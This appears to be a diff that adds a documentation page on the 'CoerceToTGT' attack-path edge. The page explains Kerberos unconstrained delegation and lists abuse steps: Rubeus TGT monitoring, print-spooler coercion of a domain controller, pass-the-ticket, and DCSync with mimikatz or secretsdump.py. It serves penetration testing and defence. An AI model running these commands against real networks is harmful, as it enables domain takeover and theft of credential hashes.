@@ -1,0 +1,125 @@
+---
+title: CoerceToTGT
+description: "The computer/user account is configured with Kerberos unconstrained delegation."
+---
+
+<img src="/assets/enterprise-AND-community-edition-pill-tag.svg"/> 
+
+
+
+In a standard Kerberos authentication process, when a principal accesses a Kerberos-enabled service, they present a service ticket to the service host (a computer or service account). This ticket cannot be used to authenticate against other services. However, if a computer or service account is trusted for unconstrained delegation, the principal sends their full Kerberos Ticket Granting Ticket (TGT). This TGT can be forwarded, allowing the service host to impersonate the principal across other services within the environment.
+
+An attacker can coerce a Tier Zero computer (e.g. DC) to authenticate against the account and obtain the target's TGT. With the TGT of a DC, the attacker can perform DCSync to compromise the domain. Alternatively, the TGT can be used to obtain admin access to the target host with a shadow credentials + silver ticket attack or a resource-based constrained delegation attack.
+
+Accounts marked as sensitive or belonging to the Protected Users group are protected against the attacks as they will not send their TGTs to accounts with unconstrained delegation enabled.
+
+## Abuse Info
+
+A common way for attackers to abuse unconstrained delegation is for the attacker to coerce a DC using the printspooler.
+
+The attack will fail if the target is a member of Protected Users or marked as sensitive, as the TGT of those principals will not be sent to the principal with unconstrained delegation. You can find all the protected principals with this Cypher query:
+
+```bash
+MATCH (g:Group)
+WHERE g.objectid ENDS WITH "-525"
+MATCH (n:Base)
+WHERE n.sensitive = TRUE OR (n)-[:MemberOf*..]->(g)
+RETURN n
+LIMIT 1000
+```
+
+There are many other coercion techniques than printspooler that can be used (see References).
+
+The instructions provided here are for abusing a computer with unconstrained delegation. For abuse of a user, see [Abusing Users Configured with Unconstrained Delegation](https://exploit.ph/user-constrained-delegation.html).
+
+**Step 1: Start monitoring for TGTs**
+
+Log in on the computer configured with unconstrained delegation and open CMD as Administrator.
+
+Start monitoring for incoming TGTs using Rubeus:
+
+```bash
+Rubeus.exe request monitor /user:<target DC DNS name> /interval:5 /nowrap
+```
+**Step 2: Coerce target DC**
+
+From any host in the domain, coerce the target DC using printspooler.
+
+Windows:
+
+```bash
+SpoolSample.exe <target DC DNS name> <compromised computer DNS name>
+```
+Linux:
+
+```bash
+printerbug.py '<domain>/<username>:<password>'@<target DC IP> <compromised computer IP>
+
+```
+
+Rubeus will print the DC TGT as it is received.
+
+**Step 3: Pass the Ticket**
+
+Windows:
+
+Inject the DC TGT into memory using Rubeus on any computer in the domain:
+
+```bash
+Rubeus.exe ptt /ticket:doIFvjCCBbqgAwI...
+```
+
+Linux:
+
+Save the TGT base64 blob as a .kirbi file:
+
+```bash
+echo "doIFvjCCBbqgAwI..." | base64 -d | tee ticket.kirbi > /dev/null
+```
+
+Convert the TGT to ccache format using ticketConverter.py:
+
+```bash
+ticketConverter.py ticket.kirbi ticket.ccache
+```
+
+Set the KRB5CCNAME environment variable to the ticket's path:
+
+```bash
+export KRB5CCNAME=$path_to_ticket.ccache
+```
+
+**Step 4: DCSync target domain**
+
+Windows:
+
+Use mimikatz to DCSync the domain from the computer where the DC TGT was injected:
+
+```bash
+lsadump::dcsync /domain:<domain.name> /user:<DOMAIN\targetuser>
+```
+Linux:
+
+Use secretsdump.py to DCSync the target domain:
+
+```bash
+secretsdump.py -k -just-dc-user <DOMAIN/targetuser> <target DC DNS name>
+```
+
+## Opsec Considerations
+
+There is no opsec information for this edge.
+
+## References
+
+[Not A Security Boundary: Breaking Forest Trusts](https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d)
+[Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
+[Abusing Users Configured with Unconstrained Delegation](https://exploit.ph/user-constrained-delegation.html)
+[(RBCD) Resource-based constrained](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
+[Windows Coerced Authentication Methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
+[Rubeus](https://github.com/GhostPack/Rubeus)
+[SpoolSample](https://github.com/leechristensen/SpoolSample)
+[mimikatz](https://github.com/gentilkiwi/mimikatz)
+[printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
+[ticketConverter.py](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py)
+[secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
